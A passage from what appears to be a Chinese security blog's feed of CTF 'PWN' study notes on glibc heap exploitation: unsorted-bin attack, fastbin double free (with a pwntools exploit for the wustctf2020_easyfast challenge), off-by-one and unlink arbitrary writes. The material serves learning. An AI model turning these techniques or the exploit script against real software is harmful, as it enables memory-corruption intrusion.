          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="err">\</span><span class="n">_</span><span class="err">\</span><span class="n">_glibc</span><span class="err">\</span><span class="n">_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): corrupted unsorted chunks 3"</span><span class="p">);</span>
          <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
</code></pre></div></div>
<p>利用主要靠上述代码，这个代码是在取出unsorted bin的时候，先检查当前bin的前一个bin(bck)的fd指针指不指向当前的bin，然后unsorted_chunks(av)（这个变量表示的就是main_arena的作为unsorted bin的头节点的那一部分）的bk指针就会指向bck，bck的fd就会指向unsorted_chunks(av)（unlink的unsorted bin 版本），这里如果能控制当前bin的bk，那么bck的值就得到了控制，进而控制了main_arena的bk的值；而main_arena的bk指向的正是链表尾部的bin，根据FIFO原则，再次malloc一个大小合适的chunk时，就会取用该chunk，而最后的语句bck-&gt;fd = unsorted_chunk(av)，如果bck的构造是一个恶意地址，那就意味着我们能往这个地址写入内容unsorted_chunk(av)，不过可惜的是，这个值基本没法控制，只知道它很大，可以用来覆盖一些本来小的值去达到意想不到的效果。</p>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[Unsorted Bin Attack]]></summary></entry><entry><title type="html">[PWN]FastbinAttack之Double free学习</title><link href="/pwn/2026/03/20/FastbinAttack-Double-free-note.html" rel="alternate" type="text/html" title="[PWN]FastbinAttack之Double free学习" /><published>2026-03-20T00:00:00+08:00</published><updated>2026-03-20T00:00:00+08:00</updated><id>/pwn/2026/03/20/FastbinAttack-Double-free-note</id><content type="html" xml:base="/pwn/2026/03/20/FastbinAttack-Double-free-note.html"><![CDATA[<h1 id="fastbinattack-double-free">FastbinAttack-Double free</h1>
<h2 id="分析">分析</h2>

<p>先来逆向看看，可以看到有个后门函数，触发方式是qword_602090等于0，而这个值默认是1。
<img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref1.png" alt="ref1" /></p>

<p>还有一个函数，可以分配用户输入的指定大小的堆</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref2.png" alt="ref2" /></p>

<p>漏洞出在下面的函数，这个函数本意是free掉刚刚分配的堆，但它却没有做任何限制，不检查指针，也不检查传入的堆内容，用户可以无条件的调用free，所以存在double free漏洞。</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref3.png" alt="ref3" /></p>

<p>同时，modify函数可以更改内存内容，不管free与否，所以也存在uaf</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref6.png" alt="ref6" /></p>

<h2 id="原理">原理</h2>

<p>首先来看看一段代码</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> 
<span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
 <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
 <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
 
 <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
 <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>这个如果编译运行的话会报错，glibc会发现chunk1已经在bin中，无法再free。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>

</code></pre></div></div>

<p>但有一种情况，是可以重复free掉chunk1的。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
 <span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
 <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
 <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
 <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
 <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
 <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>在释放完chunk2后，main_arena指向了chunk2，所以old != p了，那么就可以再free一次chunk1了，如下图，很好的展示了chunk是怎么链接的。</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref4.png" alt="ref4" /></p>

<h2 id="exploit">Exploit</h2>

<p>double_free的方法来做是这样：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./wustctf2020_easyfast</span><span class="sh">'</span>	
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>		
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">node5.buuoj.cn</span><span class="sh">'</span><span class="p">,</span> <span class="mi">25387</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

<span class="k">def</span> <span class="nf">Alloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">choice&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">size&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">Free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">choice&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">index&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">Modify</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">choice&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">index&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
	<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="nc">Alloc</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="nc">Alloc</span><span class="p">(</span><span class="mh">0X48</span><span class="p">)</span>
<span class="nc">Free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nc">Free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nc">Free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nc">Modify</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x602080</span><span class="p">))</span>
<span class="nc">Alloc</span><span class="p">(</span><span class="mh">0X48</span><span class="p">)</span>
<span class="nc">Alloc</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="nc">Modify</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">choice&gt;</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">4</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>顺序是先Alloc两个块，然后free掉第一个块，随后第二个块，此时还一切正常，而当再次free掉第一个块的时候，fastbin链表就变成了前面画的图的样子，此时因为modify并不检查写入的块是否还在，因此可以往里面写入。这时候要记一张经典老图</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref7.png" alt="ref7" /></p>

<p>一个chunk的数据结构，在使用时仅包含prev_size和size，当它释放时，原userdata的一部分空间会用来放fd和bk两个指针，指向其它空闲块，因此我们再次调用modify对一个释放的块写数据，就会覆盖掉原本的fd，在它下一次分配时，会分配当前fd指向的0x602080作为空闲块，而为什么是这个，则是因为：</p>

<p><img src="/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref5.png" alt="ref5" /></p>

<p>题目留了个后门给我们，正常情况下，2.23的glibc分配空闲块还会检查空闲块的size位正确不，而题目刚刚好把数据段的0x602088设为了0x50，刚刚好对应0x602080的size位。</p>

<p>不过modify完以后也只是改了指针，需要继续分配块，把0x602080分配出去，我们才能改里面的内容，注:modify完后，链表结构是这样，main_arena-&gt;chunk1-&gt;0x602080，而之前是main_arena-&gt;chunk1-&gt;chunk2-&gt;chunk1。最后两次alloc中，第一次alloc的是之前的chunk1（如果没有double free的话，本应该alloc chunk2），第二次则是0x602080，此时往里面写数据就可以覆盖掉shell_check了。不过这题虽然展示了double free的用法，但不是很好，因为modify不检查free，所以可以直接uaf，仅通过这题我也不能完全认识到double free的作用。</p>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[FastbinAttack-Double free 分析]]></summary></entry><entry><title type="html">[PWN]堆的Off by one学习</title><link href="/pwn/2026/03/20/Off-by-one.html" rel="alternate" type="text/html" title="[PWN]堆的Off by one学习" /><published>2026-03-20T00:00:00+08:00</published><updated>2026-03-20T00:00:00+08:00</updated><id>/pwn/2026/03/20/Off-by-one</id><content type="html" xml:base="/pwn/2026/03/20/Off-by-one.html"><![CDATA[<h1 id="off-by-one">Off-by-one</h1>

<h2 id="原理">原理</h2>

<p>Off by one指的就是只溢出了一字节，栈和堆都有这个概念，不过似乎堆的更多一点。堆中的溢出off by one，通常用来覆盖掉chunk与chunk之间的结构，使chunk重叠、以此泄漏其它块数据或覆盖其它块数据；如果溢出的一个字节为Null字节，又叫Off by null，这时候可以使size的低位prev_inuse被清空，则前一块便会被认为是free的，就可以结合其它打法去做题了。</p>

<p>glibc 2.28前，prev_inuse被清空，会导致prev_size启用，可以通过伪造prev_size造成块重叠，而2,28后则会检查前一块的size和当前块的prev_size是否相同</p>

<pre><code class="language-C">/* consolidate backward */ 
if (!prev_inuse(p)) {
	prevsize = prev_size (p);
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	/* 2.28以后加入了以下代码 */
	if (__glibc_unlikely (chunksize(p) != prevsize)) 
		malloc_printerr ("corrupted size vs. prev_size while consolidating");
		unlink_chunk (av, p); 
}
</code></pre>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[Off-by-one]]></summary></entry><entry><title type="html">[PWN]堆的Unlink学习</title><link href="/pwn/2026/03/20/Unlink.html" rel="alternate" type="text/html" title="[PWN]堆的Unlink学习" /><published>2026-03-20T00:00:00+08:00</published><updated>2026-03-20T00:00:00+08:00</updated><id>/pwn/2026/03/20/Unlink</id><content type="html" xml:base="/pwn/2026/03/20/Unlink.html"><![CDATA[<h1 id="unlink">Unlink</h1>

<p>unlink是一个把空闲chunk从双向链表拿出来的过程，基本就是数据结构中双向链表的删除。在ptmalloc 2中Unsorted bin、Small bins、Large bins都采用双向链表结构。unlink操作会在malloc或者free时触发，malloc很好理解，分配一个空闲块自然会从链表中取一个空闲块下来；而free的话，虽然是放一个空闲块进列表，但是由于存在相邻空闲块的合并操作，放之前会把相邻空闲块从链表中取出，然后合并了再放回列表，因此也有unlink操作。后者的利用较为容易。</p>

<h2 id="原理利用">原理&amp;利用</h2>

<p>首先先讲一下unlink的操作，分为以下几步</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FD = P-&gt;fd
BK = P-&gt;bk

FD-&gt;bk = BK
BK-&gt;fd = FD
</code></pre></div></div>

<p>第一步，分别取当前chunk指针P的fd位和bk位，找到P的前一个chunk和后一个chunk；</p>

<p>第二步，令前一块FD的bk指针指向P的后一块，再令后一块BK的指针fd指向P的前一块，这样P的前后两块就能互相连接了。</p>

<p>在glibc 2.3.4（不是2.34哦）之前，这个过程可以被利用来往任意地址写东西，利用如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>32 bit system
FD = P-&gt;fd, and P-&gt;fd = target_addr - 12
BK = P-&gt;bk, and P-&gt;bk = expect_value

FD-&gt;bk = BK
BK-&gt;fd = FD
</code></pre></div></div>

<p>首先，通过一些漏洞，把P的fd和bk覆盖了，这样unlink的时候，FD就会被设置为target_addr - 12，BK则是expect_value；</p>

<p>重点在FD-&gt;bk = BK，因为FD-&gt;bk实际上是取FD的指针的地址在加上bk的偏移，在32位中偏移就是12，而FD是等于target_addr - 12的，一加一减抵消了，赋值符号左边其实就是target_addr，而BK是expect_value，所以整个FD-&gt;bk = BK的语句，实际上执行的是target_addr = expect_value ，就形成了任意地址写。不过注意BK-&gt;fd = FD，其实也会往*(expect_value + 8)的地方写target_addr，必须要确保这个expect_value + 8的位置也是可写的，否则会unlink不了。</p>

<p>简单的原理弄完后来看复杂的，在2.3.4后，有了一条检查：</p>

<pre><code class="language-C">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
</code></pre>

<p>会检查FD当前的后一个和BK的前一个指针指向的到底是不是P，漏洞虽然还能用，但是只能写特定地址了：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>64 bit system
FD = P-&gt;fd, and P-&gt;fd = P - 0x18
BK = P-&gt;bk, and P-&gt;bk = P - 0x10

FD-&gt;bk = BK
BK-&gt;fd = FD
</code></pre></div></div>

<p>将fd和bk覆盖为上述值之后，能通过检查，因为FD  =  P - 0x18，所以FD-&gt;bk = P-0x18 + 0x18 = P，而BK-&gt;fd = P - 0x10 + 0x10 = P，满足前后都是P的约束。最终赋值，FD-&gt;bk = BK，使P = P - 0x10，而下一条会接着覆盖，使P = P - 0x18。基本上，现在的unlink利用就只能使一个块指针，指向它原本的位置-0x18了。</p>]]></content><author><name></name></author><category term="PWN" /><summary type="html"><![CDATA[Unlink]]></summary></entry></feed>